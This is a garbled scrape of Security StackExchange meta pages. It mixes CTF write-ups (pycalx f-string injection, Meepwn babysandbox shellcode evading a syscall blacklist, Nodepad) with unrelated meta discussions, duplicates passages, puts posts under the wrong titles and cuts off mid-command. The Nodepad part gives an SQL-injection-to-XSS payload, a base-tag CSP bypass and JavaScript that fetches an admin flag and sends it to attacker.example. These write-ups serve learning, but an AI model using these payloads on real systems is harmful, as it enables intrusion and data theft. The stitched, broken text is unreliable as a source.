<p>I first thought of some Unicode escape, mixing a Unicode string with a byte string <code>b'…'</code>, but in Python this tends to raise an exception rather than doing funky stuff. Another possibility is to use <a href=""https://docs.python.org/3/reference/lexical_analysis.html#f-strings"" rel=""nofollow noreferrer"">formatted string literals <code>f'…'</code></a>, which can embed expressions. This is a new feature of Python 3.6, but fortunately the server does run Python ≥3.6 and there was even a hint in the flag for pycalx. So the basic idea is</p>

<pre><code>'value1'+f'{code goes here}'
        ^^
        op
</code></pre>

<p>Recall that the code may not use any of the forbidden characters. But before we get there, how are we going to get the result? We don't get to see string results! We do get to see booleans though, and the code to display the result uses <code>str</code>, not <code>repr</code>, so it doesn't differentiate the string <code>'True'</code> from the boolean <code>True</code>. If we could leave <code>value</code> empty, we could do <code>''+f'{boolean expression}'</code>, but that's not allowed. A trick to get a boolean is to arrange to build one of the boolean constants in two pieces, e.g. <code>'Tru'</code> from <code>value1</code> and either <code>'e'</code> or something else from <code>value2</code>. If <code>value2</code> is <code>'e'</code> then the server prints the boolean result <code>True</code>, otherwise it prints <code>Invalid</code>. A nice thing of <code>e</code> is that it's a hexadecimal output:</p>

<pre><code>'Tru'+f'{14 if boolean expression else 0:x}'
</code></pre>

<p>The remaining difficulty is to inject something to compare with <code>FLAG</code>. This turned out to be very easy, and in fact would have simplified my solution to pycalx: we can pass whatever we want in the <code>source</code> parameter.</p>

<p>The test consists of a sandbox written with the Unicorn engine. An engine that emulates CPU instructions. The sandbox hooks into all interrupts, if <code>0x80</code> is encountered, then it will check the <code>EAX</code> register for blacklisted syscalls. If that's the case, the <code>ISBADSYSCALL</code> session variable is set to <code>True</code> which means that the payload won't be sent to the vulnerable process listening on localhost.</p>

<p>At the top of the Flask application, an interesting line <code>app.secret_key = open('private/secret.txt').read()</code> hints that we should read a <code>secret.txt</code> file in order to get the flag. Opening the binary ELF file with radare2, we get an idea what the binary does:</p>
<pre><code>➜  baby_sandbox_rev ✗ r2 -A ./bin    # open the ELF binary with radare2 and analyze it
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Type matching analysis for all functions (afta)
[x] Use -AA or aaaa to perform additional experimental analysis.
 -- The more 'a' you add after 'aa' the more analysis steps are executed.

<p>In short, it <code>mmap</code>s a region in memory with <code>(PROT_READ | PROT_WRITE | PROT_EXEC)</code> attributes, payload is <code>read</code> from stdin, <code>mprotect</code> is called to remove the <code>PROT_WRITE</code> attribute and finally the payload gets executed using <code>call eax</code>.</p>
<h2>0x02 The attack plan</h2>
<p>My basic and naïve approach is as follows:</p>
<ol>
<li>Send a base64 encoded shellcode over HTTP.</li>
<li>The shellcode should read a file in order to extract the flag.</li>
<li>Since the payload is passed to the process without returning its response over HTTP, we need to communicate back the results via another medium. I chose sockets over TCP to send this data back to my server.</li>
<li>The shellcode should not use any of the blacklisted syscalls in order to bypass the Unicorn sandbox.</li>
<li>Avoid null bytes in the resulting shellcode as it might be interpreted as end of string during the attack.</li>
<li>Setup a remote server that listens on a port to receive the response from the shellcode.</li>
</ol>
<h2>0x03 The attack</h2>
<p>To read the content of a file, we need two syscalls: <a href=""http://man7.org/linux/man-pages/man2/open.2.html"" rel=""nofollow noreferrer""><code>open</code></a> and <a href=""http://man7.org/linux/man-pages/man2/read.2.html"" rel=""nofollow noreferrer""><code>read</code></a>. These two syscalls are not allowed. I found this handy <a href=""https://syscalls.kernelgrok.com/"" rel=""nofollow noreferrer"">syscall list</a> and scrolled through it. The following two syscalls were of interest <a href=""http://man7.org/linux/man-pages/man2/openat.2.html"" rel=""nofollow noreferrer""><code>openat</code></a> and <a href=""http://man7.org/linux/man-pages/man2/readv.2.html"" rel=""nofollow noreferrer""><code>readv</code></a> although they need to be used in a certain way. This took some time to figure out and especially debug. This in combination with socket functions made the assembly code relatively lengthy and challenging for this newbie who's used to write only helloworld assembly programs. Luckily there was enough space for the shellcode so I didn't have to optimize the length of the shellcode too much.</p>

</code></pre>
<p>The secret file was however not in <code>/home/babysandbox/private/secret.txt</code>. I guessed this path since the binary was residing in <code>/home/babysandbox/babysandbox</code>. This basically meant I had to write some shellcode to traverse directories a la <code>ls</code>. This was not as straightforward as it required some fiddling with the <a href=""http://man7.org/linux/man-pages/man2/getdents.2.html"" rel=""nofollow noreferrer"">getdents syscall</a>. This is also where I failed to write proper assembly code as the output was quite giberish as can be seen in the following screenshot:</p>
<p><a href=""https://i.stack.imgur.com/RZr4T.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/RZr4T.png"" alt=""missed flag"" /></a></p>
<p>During the competition, I've missed the flag file residing at <code>/flag</code>. I could however find the <code>secret.txt</code> file which unfortunately didn't contain the flag. The secret file was related to the <a href=""https://stackoverflow.com/questions/22463939/demystify-flask-app-secret-key"">Flask app</a> itself which was used for crypto purposes. After the competition has ended, I've improved the two assembly programs which can be found at <a href=""https://raw.githubusercontent.com/Hamz-a/hamz-a.github.io/master/assets/files/meepwn2018ctf-babysandbox/readdir.s"" rel=""nofollow noreferrer"">readdir</a> and <a href=""https://raw.githubusercontent.com/Hamz-a/hamz-a.github.io/master/assets/files/meepwn2018ctf-babysandbox/readfile.s"" rel=""nofollow noreferrer"">readfile</a> in order to list a directory and extract the flag properly. The resulting shellcode is null-free:</p>
<p><a href=""https://i.stack.imgur.com/ySTqE.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ySTqE.png"" alt=""nullfree"" /></a></p>
<h2>0x04 Conclusion</h2>
<p>Although I couldn't extract the flag during the competition, I think the challenge offered some great learning experience. For one, writing the assembly code, diving into linux manuals and debugging the program was worth it. This however kind of made me &quot;stubborn&quot; so to say to suggestions. <a href=""https://security.stackexchange.com/users/414/gilles"">Gilles</a> pointed out the possibility of using <a href=""https://stackoverflow.com/questions/12806584/what-is-better-int-0x80-or-syscall""><code>sysenter</code></a> since the sandbox only checked for <code>int 0x80</code>. He even provided a link with a <a href=""https://reverseengineering.stackexchange.com/questions/2869/how-to-use-sysenter-under-linux"">fully working example</a>. I didn't look into this solution as I already spent too much time on my own approach and felt that I was close enough. It turns out that I still had to write the directory listing program from scratch.</p>
<p>Another approach was to use <a href=""http://man7.org/linux/man-pages/man2/execveat.2.html"" rel=""nofollow noreferrer""><code>execveat</code></a>. I didn't opt for this solution because I was afraid that the remote server wouldn't support it. According to the documentation:</p>
<blockquote>
<p>VERSIONS</p>
<blockquote>
<p>execveat() was added to Linux in kernel 3.19. GNU C library support is pending.</p>
</blockquote>
<p>CONFORMING TO</p>
<blockquote>
<p>The execveat() system call is Linux-specific.</p>
</blockquote>
</blockquote>
<p>To make things worse, even my own <a href=""https://github.com/0xM3R/cgPwn"" rel=""nofollow noreferrer"">Vagrant pwnbox</a> setup didn't support it. I quickly dropped this idea.</p>
<p>After the CTF ended, it is always nice to read other writeups and see how other people solved the challenge. This <a href=""https://devel0pment.de/?p=680"" rel=""nofollow noreferrer"">particular writeup</a> shows how the stack setup is different in the sandbox environment (Unicorn emulator) compared to when its executed outside of it. A simple if statement would allow us to detect whether we're inside a sandbox and exit if that's the case. This means that all the conventional syscalls can be used outside of the sandbox. Another <a href=""https://github.com/ssspeedgit00/CTF/tree/master/2018/meepwn/babysandbox"" rel=""nofollow noreferrer"">approach was to switch to x64 mode</a> and use <code>syscall</code> instead.</p>
<p>Now you know.</p>

When is it appropriate to unprotect a question?,"<h1>Meepwn 2018 CTF - babysandbox pwn challenge</h1>
<p>I couldn't get the flag during the competition but I think I was close enough to write this writeup.</p>
<h2>0x01 Reconnaissance</h2>
<p>The challenge consisted of a Flask based webapplication. The application had the following endpoints:</p>
<ul>
<li><code>/source</code>: for downloading the python <a href=""https://raw.githubusercontent.com/Hamz-a/hamz-a.github.io/master/assets/files/meepwn2018ctf-babysandbox/app.py"" rel=""nofollow noreferrer"">app.py</a> source code.</li>
<li><code>/bin</code>: for downloading an <a href=""https://raw.githubusercontent.com/Hamz-a/hamz-a.github.io/master/assets/files/meepwn2018ctf-babysandbox/bin.elf"" rel=""nofollow noreferrer"">ELF binary</a>.</li>
<li><code>/exploit</code>: to deliver a payload via a POST request in order to exploit the service.</li>
<li><code>/</code>: a simple interface to interact with all above endpoints.</li>
</ul>
<p>The exploit endpoint is obviously of interest:</p>
<pre><code>@app.route('/exploit', methods=['POST'])
def exploit():
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({'result': 'Wrong data!'})
    
    try:
        payload = b64decode(data['payload'].encode())
    except:
        return jsonify({'result': 'Wrong data!'})
    
    test_i386(UC_MODE_32, payload)
    if session['ISBADSYSCALL']:
        return jsonify({'result': 'Bad Syscall!'})
    try:
        run(['nc', 'localhost', '9999'], input=payload, timeout=2, check=True)
    except CalledProcessError:
        return jsonify({'result': 'Error run file!'})
        
    return jsonify({'result': &quot;DONE!&quot;})
</code></pre>
<p>This endpoint accepts a base64 encoded payload, performs a certain test on the payload with <code>test_i386(UC_MODE_32, payload)</code>, and if all goes well, passes it to a service listening on <code>localhost:9999</code>.</p>
<p>The test consists of a sandbox written with the Unicorn engine. An engine that emulates CPU instructions. The sandbox hooks into all interrupts, if <code>0x80</code> is encountered, then it will check the <code>EAX</code> register for blacklisted syscalls. If that's the case, the <code>ISBADSYSCALL</code> session variable is set to <code>True</code> which means that the payload won't be sent to the vulnerable process listening on localhost.</p>

<p>In short, it <code>mmap</code>s a region in memory with <code>(PROT_READ | PROT_WRITE | PROT_EXEC)</code> attributes, payload is <code>read</code> from stdin, <code>mprotect</code> is called to remove the <code>PROT_WRITE</code> attribute and finally the payload gets executed using <code>call eax</code>.</p>
<h2>0x02 The attack plan</h2>
<p>My basic and naïve approach is as follows:</p>
<ol>
<li>Send a base64 encoded shellcode over HTTP.</li>
<li>The shellcode should read a file in order to extract the flag.</li>
<li>Since the payload is passed to the process without returning its response over HTTP, we need to communicate back the results via another medium. I chose sockets over TCP to send this data back to my server.</li>
<li>The shellcode should not use any of the blacklisted syscalls in order to bypass the Unicorn sandbox.</li>
<li>Avoid null bytes in the resulting shellcode as it might be interpreted as end of string during the attack.</li>
<li>Setup a remote server that listens on a port to receive the response from the shellcode.</li>
</ol>
<h2>0x03 The attack</h2>
<p>To read the content of a file, we need two syscalls: <a href=""http://man7.org/linux/man-pages/man2/open.2.html"" rel=""nofollow noreferrer""><code>open</code></a> and <a href=""http://man7.org/linux/man-pages/man2/read.2.html"" rel=""nofollow noreferrer""><code>read</code></a>. These two syscalls are not allowed. I found this handy <a href=""https://syscalls.kernelgrok.com/"" rel=""nofollow noreferrer"">syscall list</a> and scrolled through it. The following two syscalls were of interest <a href=""http://man7.org/linux/man-pages/man2/openat.2.html"" rel=""nofollow noreferrer""><code>openat</code></a> and <a href=""http://man7.org/linux/man-pages/man2/readv.2.html"" rel=""nofollow noreferrer""><code>readv</code></a> although they need to be used in a certain way. This took some time to figure out and especially debug. This in combination with socket functions made the assembly code relatively lengthy and challenging for this newbie who's used to write only helloworld assembly programs. Luckily there was enough space for the shellcode so I didn't have to optimize the length of the shellcode too much.</p>

<p>The secret file was however not in <code>/home/babysandbox/private/secret.txt</code>. I guessed this path since the binary was residing in <code>/home/babysandbox/babysandbox</code>. This basically meant I had to write some shellcode to traverse directories a la <code>ls</code>. This was not as straightforward as it required some fiddling with the <a href=""http://man7.org/linux/man-pages/man2/getdents.2.html"" rel=""nofollow noreferrer"">getdents syscall</a>. This is also where I failed to write proper assembly code as the output was quite giberish as can be seen in the following screenshot:</p>
<p><a href=""https://i.stack.imgur.com/RZr4T.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/RZr4T.png"" alt=""missed flag"" /></a></p>
<p>During the competition, I've missed the flag file residing at <code>/flag</code>. I could however find the <code>secret.txt</code> file which unfortunately didn't contain the flag. The secret file was related to the <a href=""https://stackoverflow.com/questions/22463939/demystify-flask-app-secret-key"">Flask app</a> itself which was used for crypto purposes. After the competition has ended, I've improved the two assembly programs which can be found at <a href=""https://raw.githubusercontent.com/Hamz-a/hamz-a.github.io/master/assets/files/meepwn2018ctf-babysandbox/readdir.s"" rel=""nofollow noreferrer"">readdir</a> and <a href=""https://raw.githubusercontent.com/Hamz-a/hamz-a.github.io/master/assets/files/meepwn2018ctf-babysandbox/readfile.s"" rel=""nofollow noreferrer"">readfile</a> in order to list a directory and extract the flag properly. The resulting shellcode is null-free:</p>
<p><a href=""https://i.stack.imgur.com/ySTqE.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/ySTqE.png"" alt=""nullfree"" /></a></p>
<h2>0x04 Conclusion</h2>
<p>Although I couldn't extract the flag during the competition, I think the challenge offered some great learning experience. For one, writing the assembly code, diving into linux manuals and debugging the program was worth it. This however kind of made me &quot;stubborn&quot; so to say to suggestions. <a href=""https://security.stackexchange.com/users/414/gilles"">Gilles</a> pointed out the possibility of using <a href=""https://stackoverflow.com/questions/12806584/what-is-better-int-0x80-or-syscall""><code>sysenter</code></a> since the sandbox only checked for <code>int 0x80</code>. He even provided a link with a <a href=""https://reverseengineering.stackexchange.com/questions/2869/how-to-use-sysenter-under-linux"">fully working example</a>. I didn't look into this solution as I already spent too much time on my own approach and felt that I was close enough. It turns out that I still had to write the directory listing program from scratch.</p>
<p>Another approach was to use <a href=""http://man7.org/linux/man-pages/man2/execveat.2.html"" rel=""nofollow noreferrer""><code>execveat</code></a>. I didn't opt for this solution because I was afraid that the remote server wouldn't support it. According to the documentation:</p>
<blockquote>
<p>VERSIONS</p>
<blockquote>
<p>execveat() was added to Linux in kernel 3.19. GNU C library support is pending.</p>
</blockquote>
<p>CONFORMING TO</p>
<blockquote>
<p>The execveat() system call is Linux-specific.</p>
</blockquote>
</blockquote>
<p>To make things worse, even my own <a href=""https://github.com/0xM3R/cgPwn"" rel=""nofollow noreferrer"">Vagrant pwnbox</a> setup didn't support it. I quickly dropped this idea.</p>
<p>After the CTF ended, it is always nice to read other writeups and see how other people solved the challenge. This <a href=""https://devel0pment.de/?p=680"" rel=""nofollow noreferrer"">particular writeup</a> shows how the stack setup is different in the sandbox environment (Unicorn emulator) compared to when its executed outside of it. A simple if statement would allow us to detect whether we're inside a sandbox and exit if that's the case. This means that all the conventional syscalls can be used outside of the sandbox. Another <a href=""https://github.com/ssspeedgit00/CTF/tree/master/2018/meepwn/babysandbox"" rel=""nofollow noreferrer"">approach was to switch to x64 mode</a> and use <code>syscall</code> instead.</p>

Is banhammer the best way to handle link only answers?,"<p>IMHO its rubbish, there are three problems here, the first is that there is a large number of users that don't recognize that offensive skills are useful for defense, the closing of offensive computing questions is nothing new:</p>

<p>The second problem is that this specific excuse is used liberally, such as someone asking about exploiting MS08-67 in a lab and getting shut down with this reason and then I have to go and vote to reopen...</p>

<p>The third problem is that it just teaches the script kiddies to lie, and state that they are testing the security of their own website and do a quick search and replace on logs/tool output. Voila, now their ""blackhat"" question is a ""whitehat"" question.</p>

<p>Other methods are used too, such as diverting questions about memory corruption or shellcode to other SO sites or closing them as off topic, I just spotted this in my close votes queue as off topic:</p>

This can include anything from a quote from the link to an entire paragraph analyzing what is being discussed on the other side of the hypertext. Use your own judgement.</p>

<p>Take an example of an <a href=""https://security.stackexchange.com/a/183887/165253"">answer</a> which I posted. The question was why a certain decision was made for Ubuntu, and the answer was present on their own website. Instead of linking only to the website, I wrote a quick summary of the reasoning, and then quoted the relevant sections. If the blog post which contained the canonical answer (pardon the pun) was ever to vanish, the answer would still be just as relevant. If I had only mentioned that the reasoning was explained on the blog and then linked to the blog, my answer would have likely been deleted, too.</p>

There is a very big difference between checksums and hashes. A hash is a stateless function that maps data of an arbitrary size to a fixed size in the form of <em>ƒ : {0,1}<sup>*</sup> → {0,1}<sup>n</sup></em>. A checksum on the other hand is typically nothing more than the weighted summation of a function of each data word (whether said function is a lookup table or the identity function), modulo a small value. This is a very specific definition and does not at all apply to hashes. If only three people are using the tags, just replace it, don't merge it.</p>

Should we transcribe screenshots of text?,"<p>I swear there was a better duplicate on another meta somewhere, but the best I can find now is <a href=""https://unix.meta.stackexchange.com/q/4086"">this</a>. I think most SE sites prefer text over images <em>if</em> it is the text that is relevant and the image isn't really necessary.</p>

<p>Since the OP can easily copy/paste the original text rather than someone else having to transcribe it from the image I think it's best to inform OP that they should copy text instead of posting images, so that their future posts won't have the same issue. If the original text can't be copied for some reason then posting an image is more forgivable.</p>

Should we transcribe screenshots of text?,"<p>Indeed, people asking about checksums here do seem to want to use them for some security purpose, which means that they're looking for a cryptographic hash (or they're wrong about wanting a secure checksum). The tag <a href=""https://security.stackexchange.com/questions/tagged/checksum"" class=""post-tag"" title=""show questions tagged &#39;checksum&#39;"" rel=""tag"">checksum</a> hasn't been used for anything else and I can't think of an alternative meaning.

<p>The only times we ever disallow otherwise on-topic questions is if it is illegal to discuss in the US. Thankfully, the US has fairly strong laws for protecting the rights to discuss concepts in information security. Discussing censorship evasion is absolutely legal and thus can be discussed on the Stack Exchange network. If there is a realistic worry that the network could be blocked due to the questions asked here, we should bring the problem up on Meta.SE, where they would advise whether or not Sec.SE is breaking any network rules. We absolutely should <em>not</em> try to interpret and adjust the rules ourselves and play Stack Exchange, Inc. police.</p>

<p><strong>We do not disallow discussions just because some government doesn't like it.</strong></p>

<p>If the question is simple and clearly has had no research put into it, or if it's merely asking us to recommend some proxy server, it is clearly off-topic. Compare a question asking nothing more than what proxy should be used to go to Facebook in China with a question asking about the theory behind covert-communication, e.g. ICMPTX and how it can be used to avoid censorship. The former should be off-topic because it shows no understanding of the concepts and is just asking for us to hand them a solution on a silver platter, but the latter is fine. Do we really want this:</p>

<blockquote>
  <p>Questions asking us to break the security of a specific system for you are off-topic unless they demonstrate an understanding of the concepts involved and clearly identify a specific problem, unless the system was set up by a government, in which case it is always off-topic.</p>

<p><strong>A government can be a valid adversary in someone's threat model.</strong></p>

<p>Why can a government not be a valid adversary in information security? If the question was about bypassing censorship imposed by an attacker who had gained access to a company's infrastructure so one could retrieve server logs, no one would even <em>think</em> of closing it, anymore than they would think of closing a question on bypassing malware AV-evasion techniques because, after all, it involves trying to bypass the security of a piece of software. Would there be a worry if someone were asking about doing the same to state-sponsored malware? There are countries out there which disallow discussing many of the things we discuss, but we do not censor things just because they might not like the discussion.</p>

<p>Communications security involves the ability to send a message without it being intercepted and blocked. Censorship, whether done by a government or blackhat hacker is a type of counter-intelligence. As such, both blocking specific messages and getting around such blocks fits squarely within the realm of infosec. As long as the question is not specifically asking how to break a <em>specific</em> system <em>without</em> showing understanding of the concepts is a close reason we have. We do not, and should not, have a close reason for <em>evading censorship</em>.</p>

<p><strong>What makes Sec.SE special?</strong></p>

<p>If the idea is that we risk getting the network blocked by discussing things that are not permitted in other, foreign countries, then it should apply to the entire network. I constantly see questions on IPS which discuss homosexuality-related topics such as coming out to parents. Such discussions are not permitted online under Russian law, and Roskomnadzor is free to block any site which does discuss it. Should homosexuality be a bannable topic on IPS because we are afraid to get blocked by RKN? What about that Iranian atheist who asked on Law.SE how to leave his country so as not to be executed? Should we have flagged his question for explicitly trying to break a law? If not, then why is it on Sec.SE that we have to tiptoe around governments?</p>

Would there be a worry if someone were asking about doing the same to state-sponsored malware? There are countries out there which disallow discussing many of the things we discuss, but we do not censor things just because they might not like the discussion.</p>

<p>Communications security involves the ability to send a message without it being intercepted and blocked. Censorship, whether done by a government or blackhat hacker is a type of counter-intelligence. As such, both blocking specific messages and getting around such blocks fits squarely within the realm of infosec. As long as the question is not specifically asking how to break a <em>specific</em> system <em>without</em> showing understanding of the concepts is a close reason we have. We do not, and should not, have a close reason for <em>evading censorship</em>.</p>

<p><strong>What makes Sec.SE special?</strong></p>

<p>If the idea is that we risk getting the network blocked by discussing things that are not permitted in other, foreign countries, then it should apply to the entire network. I constantly see questions on IPS which discuss homosexuality-related topics such as coming out to parents. Such discussions are not permitted online under Russian law, and Roskomnadzor is free to block any site which does discuss it. Should homosexuality be a bannable topic on IPS because we are afraid to get blocked by RKN? What about that Iranian atheist who asked on Law.SE how to leave his country so as not to be executed? Should we have flagged his question for explicitly trying to break a law? If not, then why is it on Sec.SE that we have to tiptoe around governments?</p>

<p>Not from what I've seen of the shift in the balance of new votes as a thread ages. All indications are that the top post is read by many, many more people than those lower down. I've been looking for a poll of answers read per thread, but without luck.</p>

<blockquote>
  <ul>
  <li>If not, could this be resolved by a change in policy or would a new site mechanic be necessary?</li>
  </ul>

<p>Frankly, SE has far outgrown the original context for which its interface was designed. It is ill-equipped to handle controversial or potentially harmful content. This potential for harm is particularly apparent and most frequently an issue on IPS, parenting, DIY, etc., but the superficially technical veneer of security.SE makes it seem more similar to the relatively safe Stack Overflow for which the interface was designed and is a near perfect fit. But in terms of the stakes, the behavioural component, the existence of an adversary, security.SE is vastly different.</p>

<p>A technically literate answer may appear appropriate to many, despite profound misunderstanding of the behavioural component. An apparently strong answer might accurately evaluate the risk a given policy poses to the individual and characterise this as low, but fail to account for a population size that would imply a large number of expected victims. As security professionals, an alarming number of high ranking site users place undue trust in the motivations of other security professionals (if not always in their competence). Such issues create the potential for harm and can provoke the kind of community dissent for which the SE format is ill-equipped. I am sceptical that the problem can be resolved within the format.</p>

<p>But if questions with such potential are to be asked and answered, I believe that the simplest approach to restore some measure of community protection is to modify the stock comment left by mods when deleting comments on the most controversial posts. Instead of:</p>

<blockquote>
  <p>Comments are not for extended discussion; this conversation has been
  moved to chat.</p>
</blockquote>

<p>I suggest something to the effect of:</p>

<blockquote>
  <p>This answer has received a large volume of critical comments and may be considered <strong>controversial</strong>. Please read and consider all answers in your decision making.
  Comments are not for extended discussion; this conversation has been
  moved to chat.</p>
</blockquote>

<p>where ""<strong>controversial</strong>"" is a link to a community-sourced definition as it should apply to posts on security.SE</p>

<p>Personally, I'd prefer ""harmful"", but I don't imagine mods being comfortable labelling answers as such. (Actually I'd prefer to see whole SE sites closed down and potentially harmful content aggressively removed, but that will clearly ever happen.)</p>

What does '101' reputation (on many sites) means in profiles of some high rep users?,"<h1>Nodepad (web, medium)</h1>

<p><a href=""http://nodepad.hackable.software:3000/"" rel=""nofollow noreferrer"">Nodepad</a> is a Node.js web application powered by the Express framework and a PostgreSQL backend DB. It allows users to register, log in and create simple notes. Additionally, there is an admin bot visiting every note that is reported to them in the latest version of Google Chrome.</p>

<p><em>The entire challenge setup was published beforehand (<a href=""https://www68.zippyshare.com/v/ErAkmpqQ/file.html"" rel=""nofollow noreferrer"">source mirror</a>). Also, if you didn't participate in the CTF, I'd encourage you to set up the challenge locally and attempt it yourself first, before reading the write-up.</em></p>

<h2>What's the admin bot doing?</h2>

<p>From looking into the admin bot implementation at <code>/bin/process_reports</code>, we learn that once a note is reported, the admin logs in and visits <code>/admin/${id}</code> where <code>id</code> is the ID of reported note. Clearly, we somehow need to XSS the admin and exfiltrate the flag.</p>

<p>Let's check out <code>routes/admin.js</code>. The flag can apparently be fetched from <code>/admin/flag</code>:</p>

<pre>
router.get('/flag', (req, res) => {
  res.render('index', {notices: [process.env.FLAG]});
});
</pre>

<p>And the admin's note view is essentially the same as any user's note view:</p>

<pre>
router.get('/:noteId(\\d+)', async (req, res) => {
  const notes = await req.db.all `SELECT id, title, content FROM notes WHERE id = ${req.params.noteId}`;
  res.render('notes', {notes});
});
</pre>

<p>So if there's an XSS flaw, it must be triggered here.</p>

<h2>O XSS, where art thou?</h2>

<p>The current notes are fetched as JSON, <code>JSON.stringify</code>'ed and inserted as an inline script:</p>

<pre><code>&lt;script nonce=""78172121522105a149287e6d32966f43""&gt;
  window.notes = [{""id"":2597,""title"":""foo"",""content"":""bar"",""pinned"":true}, ...];
&lt;/script&gt;
</code></pre>

<p>Then, a script (<code>/public/javascripts/notes.js</code>) is inserting the notes into the page. But wait, it's inserting the note title via jQuerys <a href=""https://api.jquery.com/html/#html-htmlString"" rel=""nofollow noreferrer""><code>.html()</code></a> instead of using the safe <code>.text()</code>:</p>

<pre>
function createNote(note) {
  ...
  element.find('.title').html(note.title);
  ...
}
</pre>

<p>So if we could get HTML into a note title, we'd have stored XSS.</p>

<h2>How to get HTML into a note?</h2>

<p>Sadly, the app is testing the title and body of every new note against <code>/[&lt;&gt;]/</code>. So, there's no way to submit a note with angle brackets in it:</p>

<pre><code>router.post('/new', async (req, res) =&gt; {
  const regex = /[&lt;&gt;]/;

  let errors = [];
  if (regex.test(req.body.title)) {
    errors.push('Title is invalid');
  }

  if (regex.test(req.body.content)) {
    errors.push('Content is invalid');
  }

  if (errors.length !== 0) {
    return res.render('new', {errors});

  // [If there are no errors, insert note into DB]
}
</code></pre>

<p>If we can't get HTML into a note regularly, we need an SQL injection...</p>

<h2>Where's the SQLi?</h2>

<p>SQL queries in the app are written as <a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals"" rel=""nofollow noreferrer"">template literals</a>, e.g.:</p>

<pre><code>await req.db.run `DELETE FROM notes WHERE user_id = ${req.session.userId} AND id = ${req.params.noteId}`;
</code></pre>

<p>That's an elegant way of protecting against SQL injections. Note that this notation requires no brackets after <code>req.db.run</code>. The way template literals work is that this is essentially calling:</p>

<pre><code>req.db.run(
  [""DELETE FROM notes WHERE user_id = "", "" AND id = "", """"],
  req.session.userId,
  req.params.noteId
)
</code></pre>

<p>Like with <em>prepared statements</em>, you can see that the query is separated from the data. The DB adapter is processing the arguments so that this ends up as the following query:</p>

<pre><code>sql_query(""DELETE FROM notes WHERE user_id =  $1  AND id =  $2"", req.session.userId, req.params.noteId)
</code></pre>

<p>Pretty tamper-proof, eh?</p>

<h2>Pinning down the bug</h2>

<p>Luckily, the query for pinning a note has a subtle bug:</p>

<pre>
router.post('/:noteId(\\d+)/pin', async (req, res) => {
  if (req.body.value && req.body.value.length === 1) {
    const result = await req.db.run(`UPDATE notes SET pinned = ${req.body.value}::boolean WHERE id = ${req.params.noteId}`);
    if (result.error) {
      return res.render('index', {errors: ['An error occurred']});
    }
  }
  ...
});
</pre>

<p><code>req.db.run</code> is called with brackets! This means, it looks like a prepared statement, but it's not. The whole query is turned into a single string before it's passed to <code>db.run</code>. So the app treats it as one single fixed query without any parameters, e.g.:</p>

<pre><code>sql_query(""UPDATE notes SET pinned = 1::boolean WHERE id = 1234"")
</code></pre>

<p>instead of</p>

<pre><code>sql_query(""UPDATE notes SET pinned = $1 ::boolean WHERE id = $2"", req.body.value, req.params.noteId)
</code></pre>

<p>Nice, that's an SQLi! But there's another nasty check. Looking at the pinning function again, we find that it first checks that:</p>

<pre><code>req.body.value &amp;&amp; req.body.value.length === 1
</code></pre>

<p>Looks like we can only SQL-inject a single character - which would be useless.</p>

<h2>Bypassing the length check</h2>

<p>Express apps accept other request content types than just <code>application/x-www-form-urlencoded</code> by default. So maybe we can trick the length check by sending JSON (<code>application/json</code>) instead which will be parsed into a JS object on the server side. These are equivalent:</p>

<pre><code>_csrf=ilkJroTE-mNtLgELBHLjGP8t2WGsI9TFPkq8&amp;value=1
</code></pre>

<p>and</p>

<pre><code>{""_csrf"": ""ilkJroTE-mNtLgELBHLjGP8t2WGsI9TFPkq8"", ""value"": 1}
</code></pre>

<p>Now, a simple trick to pass <code>value.length === 1</code> is by sending an array with one element instead of a string or number:</p>

<pre><code>{""_csrf"": ""ilkJroTE-mNtLgELBHLjGP8t2WGsI9TFPkq8"", ""value"": [""more than one character!""]}
</code></pre>

<p>This way, we can finally construct an SQLi payload. The following payload will insert a script tag into our note title:</p>

<pre><code>1::boolean, title='&lt;script&gt;alert(1)&lt;/script&gt;' WHERE id = 2597--
</code></pre>

<p>which ends up as</p>

<pre><code>UPDATE notes SET pinned = 1::boolean, title='&lt;script&gt;alert()&lt;/script&gt;' WHERE id = 2597-- ::boolean WHERE id = 2597
</code></pre>

<h2>A wild CSP appears</h2>

<p>Not so fast. The app has implemented a CSP which will block all inline scripts unless they are tagged with a dynamic random nonce:</p>

<pre>
Content-Security-Policy:
  default-src 'none';
  <b>script-src 'nonce-78172121522105a149287e6d32966f43' 'strict-dynamic';</b>
  style-src 'self' https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css;
  img-src 'self';
  connect-src 'self';
  frame-src https://www.google.com/recaptcha/;
  form-action 'self';  
</pre>

<p>Our XSS injection point in the title is useless!<sup>1</sup> But there's another one. Remember that the note data is injected in an inline script via <code>JSON.stringify()</code>? <code>JSON.stringify</code> doesn't sanitize angle brackets, so we can inject tags into the HTML <code>&lt;head&gt;</code> of the document, which will look something like this:</p>

<pre><code>&lt;head&gt;
  &lt;script nonce=""78172121522105a149287e6d32966f43""&gt;
    window.notes = [{""id"":2597,""title"":""&lt;/script&gt;[INJECT TAGS HERE]"",""content"":""bar"",""pinned"":true}, ...];
  &lt;/script&gt;
  &lt;script nonce=""78172121522105a149287e6d32966f43"" src=""/javascripts/notes.js""&gt;&lt;/script&gt;
&lt;/head&gt;
</code></pre>

<p>Err... how does that help? We still don't have the random nonce.</p>

<h2>Drop that base</h2>

<p>Notice how the second <code>&lt;script&gt;</code> in the head has a <code>nonce</code> attribute and is a <em>relative</em> URL? We can redirect that script somewhere else by injecting a <a href=""https://developer.mozilla.org/en-US/docs/Web/HTML/Element/base"" rel=""nofollow noreferrer""><code>&lt;base&gt;</code></a> tag before it.</p>

<p>So, if we inject <code>&lt;base href=""http://attacker.example/""&gt;</code> before the relative remote script, the browser will request <code>http://attacker.example/javascripts/notes.js</code> instead, which satisfies the CSP rules.</p>

<p>Our injected <code>notes.js</code> can then just fetch the flag and log it somewhere:</p>

<pre><code>fetch(location.protocol + '//' + location.host + '/admin/flag').then((res) =&gt; {
    res.text().then((text) =&gt; {
        location.href = 'http://attacker.example/log?' + btoa(text);
    });
})
</code></pre>

<p>Now, let's insert that final payload in our note title:</p>

<pre><code>$ curl \
